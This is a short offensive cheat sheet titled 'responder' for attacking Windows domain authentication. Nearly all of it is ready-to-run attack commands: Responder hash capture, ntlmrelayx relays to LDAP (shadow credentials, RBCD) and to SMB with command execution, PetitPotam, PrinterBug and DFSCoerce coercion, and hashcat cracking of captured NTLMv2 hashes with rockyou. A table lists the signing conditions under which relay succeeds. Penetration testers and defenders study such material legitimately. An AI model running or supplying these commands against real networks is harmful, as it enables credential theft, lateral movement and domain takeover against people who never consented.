title: responder
html:
responder

> Capture or relay NTLM authentication on the network. Use when you can coerce or intercept auth.

Responder (Capture Hashes)

# Basic capture
Responder -I tun0

# Analysis mode (passive)
Responder -I tun0 -A

# Logs at: /opt/tools/Responder/logs/ or ~/.local/share/responder/logs/

ntlmrelayx (Relay Instead of Capture)

# Relay to LDAP (for shadow creds or RBCD)
ntlmrelayx.py -t ldap://DC_IP --shadow-credentials --shadow-target victim -smb2support

# Relay for RBCD
ntlmrelayx.py -t ldap://DC_IP --delegate-access -smb2support

# Relay to SMB (command execution)
ntlmrelayx.py -t smb://TARGET -smb2support -c 'whoami'

# SOCKS mode (maintain relay session)
ntlmrelayx.py -t smb://TARGET -smb2support -socks

Coercion (Force Authentication)

# PetitPotam (MS-EFSRPC)
PetitPotam.py -u user -p pass -d domain LISTENER_IP TARGET_IP

# PrinterBug (MS-RPRN)
printerbug.py 'domain/user:pass@TARGET' LISTENER_IP

# DFSCoerce (MS-DFSNM)
dfscoerce.py -u user -p pass -d domain LISTENER_IP TARGET_IP

When Relay Works

| Condition | SMB→SMB | SMB→LDAP | HTTP→LDAP | |-----------|---------|----------|-----------| | SMB signing required | No | No | N/A | | LDAP signing required | N/A | No | No | | Channel binding | N/A | No | No |

Crack NTLMv2

hashcat -m 5600 captured_hash.txt /usr/share/wordlists/rockyou.txt
